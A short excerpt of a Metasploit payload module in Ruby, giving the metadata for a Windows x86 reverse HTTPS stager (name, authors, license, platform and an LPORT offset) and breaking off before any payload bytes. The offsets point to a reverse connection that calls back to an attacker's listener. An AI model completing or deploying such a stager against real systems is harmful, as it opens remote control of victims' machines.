...
module Metasploit3
	...
	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse HTTPS Stager with Service functions',
			'Version'       => '$Revision: 14976 $',
			'Description'   => 'Tunnel communication over HTTP using SSL after SetStatus RUNNING',
			'Author'        => ['hdm', 'agix'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
					...
					'Offsets' =>
						{
							...
							# 'EXITFUNC' => [ 290, 'V' ],
							'LPORT'    => [ 190+141, 'v' ], # Not a typo, really little endian
						},
					'Payload' =>
